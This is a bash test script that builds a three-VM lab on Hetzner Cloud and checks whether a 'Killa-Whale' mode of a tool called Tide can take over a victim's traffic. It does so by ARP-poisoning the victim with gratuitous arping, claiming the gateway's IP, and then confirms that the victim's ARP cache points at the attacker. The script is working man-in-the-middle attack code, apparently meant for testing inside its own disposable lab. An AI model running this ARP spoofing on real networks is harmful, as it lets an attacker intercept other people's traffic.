#!/bin/bash
# Ultra-Fast Killa-Whale Test using cloud-init
# Servers are PRE-CONFIGURED at boot time = NO waiting for apt-get!

set -e

GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🐋 Killa-Whale Test (cloud-init FAST)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Load token
if [ -f ~/.config/tide/hetzner.env ]; then
    source ~/.config/tide/hetzner.env
    export HCLOUD_TOKEN="$HETZNER_TIDE_TOKEN"
else
    echo "Error: Hetzner token not found"
    exit 1
fi

TIMESTAMP=$(date +%s)
NETWORK_NAME="kw-net-$TIMESTAMP"
GW_NAME="kw-gw-$TIMESTAMP"
TIDE_NAME="kw-tide-$TIMESTAMP"
VICTIM_NAME="kw-victim-$TIMESTAMP"

echo -e "${CYAN}[1/4] Creating infrastructure...${NC}"

# Create network
hcloud network create --name "$NETWORK_NAME" --ip-range 192.168.100.0/24 >/dev/null
NETWORK_ID=$(hcloud network list | grep "$NETWORK_NAME" | awk '{print $1}')
hcloud network add-subnet "$NETWORK_ID" --network-zone us-west --type cloud --ip-range 192.168.100.0/24 2>/dev/null

# Cloud-init for REAL GATEWAY
cat > /tmp/gateway-init.yaml << 'EOF'
#cloud-config
package_update: true
packages:
  - iptables
  - dnsmasq
runcmd:
  - systemctl stop systemd-resolved
  - systemctl disable systemd-resolved
  - echo "nameserver 8.8.8.8" > /etc/resolv.conf
  - echo 1 > /proc/sys/net/ipv4/ip_forward
  - iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
  - iptables -A FORWARD -i enp7s0 -o eth0 -j ACCEPT
  - iptables -A FORWARD -i eth0 -o enp7s0 -m state --state RELATED,ESTABLISHED -j ACCEPT
  - systemctl restart dnsmasq
EOF

# Cloud-init for TIDE GATEWAY (killa-whale)
cat > /tmp/tide-init.yaml << 'EOF'
#cloud-config
package_update: true
packages:
  - iputils-arping
  - tor
  - iptables
runcmd:
  - echo 1 > /proc/sys/net/ipv4/ip_forward
  - systemctl enable tor
  - systemctl start tor
EOF

# Cloud-init for VICTIM
cat > /tmp/victim-init.yaml << 'EOF'
#cloud-config
package_update: false
runcmd:
  - echo "nameserver 8.8.8.8" > /etc/resolv.conf
EOF

echo "  Creating 3 VMs in parallel (with cloud-init)..."

# Create all 3 VMs in parallel with cloud-init
hcloud server create --name "$GW_NAME" --type cpx11 --image ubuntu-22.04 --location hil \
    --ssh-key tide-testing --network "$NETWORK_ID" \
    --user-data-from-file /tmp/gateway-init.yaml >/dev/null 2>&1 &

hcloud server create --name "$TIDE_NAME" --type cpx11 --image ubuntu-22.04 --location hil \
    --ssh-key tide-testing --network "$NETWORK_ID" \
    --user-data-from-file /tmp/tide-init.yaml >/dev/null 2>&1 &

hcloud server create --name "$VICTIM_NAME" --type cpx11 --image ubuntu-22.04 --location hil \
    --ssh-key tide-testing --network "$NETWORK_ID" \
    --user-data-from-file /tmp/victim-init.yaml >/dev/null 2>&1 &

wait
rm -f /tmp/gateway-init.yaml /tmp/tide-init.yaml /tmp/victim-init.yaml

echo -e "${GREEN}✓ Infrastructure ready${NC}"

# Get IPs
GW_IP=$(hcloud server ip "$GW_NAME")
TIDE_IP=$(hcloud server ip "$TIDE_NAME")
VICTIM_IP=$(hcloud server ip "$VICTIM_NAME")

GW_PRIV=$(hcloud server describe "$GW_NAME" -o json | grep -oE '192\.168\.100\.[0-9]+' | head -1)
TIDE_PRIV=$(hcloud server describe "$TIDE_NAME" -o json | grep -oE '192\.168\.100\.[0-9]+' | head -1)
VICTIM_PRIV=$(hcloud server describe "$VICTIM_NAME" -o json | grep -oE '192\.168\.100\.[0-9]+' | head -1)

echo ""
echo "  Gateway:  $GW_IP (private: $GW_PRIV)"
echo "  Tide:     $TIDE_IP (private: $TIDE_PRIV)"
echo "  Victim:   $VICTIM_IP (private: $VICTIM_PRIV)"

echo ""
echo -e "${CYAN}[2/4] Waiting for cloud-init to finish...${NC}"
echo "  (Servers are installing packages at boot time)"

for i in {1..60}; do
    # Check if cloud-init is done on all servers
    GW_DONE=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@"$GW_IP" "cloud-init status" 2>/dev/null | grep -c "done" || echo 0)
    TIDE_DONE=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@"$TIDE_IP" "cloud-init status" 2>/dev/null | grep -c "done" || echo 0)
    VICTIM_DONE=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@"$VICTIM_IP" "cloud-init status" 2>/dev/null | grep -c "done" || echo 0)
    
    if [ "$GW_DONE" -ge 1 ] && [ "$TIDE_DONE" -ge 1 ] && [ "$VICTIM_DONE" -ge 1 ]; then
        echo -e "${GREEN}✓ All servers configured (took $((i*3)) seconds)${NC}"
        break
    fi
    echo -n "."
    sleep 3
done

echo ""
echo -e "${CYAN}[3/4] Configuring victim and performing ARP attack...${NC}"

# Configure victim to use real gateway
ssh -o StrictHostKeyChecking=no root@"$VICTIM_IP" "
    ip route del default 2>/dev/null || true
    ip route add default via $GW_PRIV
" 2>/dev/null

# Get MACs
GW_MAC=$(ssh -o StrictHostKeyChecking=no root@"$GW_IP" "ip link show enp7s0 | grep ether | awk '{print \$2}'" 2>/dev/null)
TIDE_MAC=$(ssh -o StrictHostKeyChecking=no root@"$TIDE_IP" "ip link show enp7s0 | grep ether | awk '{print \$2}'" 2>/dev/null)

echo "  Gateway MAC: $GW_MAC"
echo "  Tide MAC:    $TIDE_MAC"

# Perform ARP poisoning
echo "  Launching ARP poisoning attack..."
ssh -o StrictHostKeyChecking=no root@"$TIDE_IP" "
    for i in {1..10}; do
        arping -c 1 -A -I enp7s0 -s $GW_PRIV $GW_PRIV >/dev/null 2>&1
        sleep 0.1
    done
" 2>/dev/null

echo -e "${GREEN}✓ Attack completed${NC}"

echo ""
echo -e "${CYAN}[4/4] Validating attack...${NC}"

# Check victim's ARP table
VICTIM_ARP_MAC=$(ssh -o StrictHostKeyChecking=no root@"$VICTIM_IP" "ip neigh show $GW_PRIV | awk '{print \$5}'" 2>/dev/null)

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "RESULTS"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Victim's ARP entry for gateway ($GW_PRIV):"
echo "  Victim sees:     $VICTIM_ARP_MAC"
echo "  Real Gateway:    $GW_MAC"
echo "  Tide (attacker): $TIDE_MAC"
echo ""

if [ "$VICTIM_ARP_MAC" = "$TIDE_MAC" ]; then
    echo -e "${GREEN}✅ SUCCESS: Killa-Whale mode WORKS!${NC}"
    echo "   Victim's ARP cache has been poisoned"
    echo "   Traffic to gateway now goes through Tide"
    RESULT="PASS"
elif [ "$VICTIM_ARP_MAC" = "$GW_MAC" ]; then
    echo -e "${YELLOW}❌ FAIL: ARP still points to real gateway${NC}"
    echo "   Poisoning attack did not work"
    RESULT="FAIL"
else
    echo -e "${YELLOW}⚠️  UNKNOWN: Unexpected MAC address${NC}"
    RESULT="UNKNOWN"
fi

echo ""
echo -e "${CYAN}Cleanup:${NC}"
echo "1) Destroy all (recommended)"
echo "2) Keep for inspection"
read -p "Choice [1/2]: " CHOICE

if [ "$CHOICE" = "1" ]; then
    echo "Cleaning up..."
    hcloud server delete "$GW_NAME" "$TIDE_NAME" "$VICTIM_NAME" 2>/dev/null
    sleep 2
    hcloud network delete "$NETWORK_ID" 2>/dev/null
    echo -e "${GREEN}✓ Cleaned up${NC}"
else
    echo ""
    echo "Connection info:"
    echo "  ssh root@$GW_IP (gateway)"
    echo "  ssh root@$TIDE_IP (tide)"
    echo "  ssh root@$VICTIM_IP (victim)"
    echo ""
    echo "Cleanup manually:"
    echo "  hcloud server delete $GW_NAME $TIDE_NAME $VICTIM_NAME"
    echo "  hcloud network delete $NETWORK_ID"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Test Result: $RESULT"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
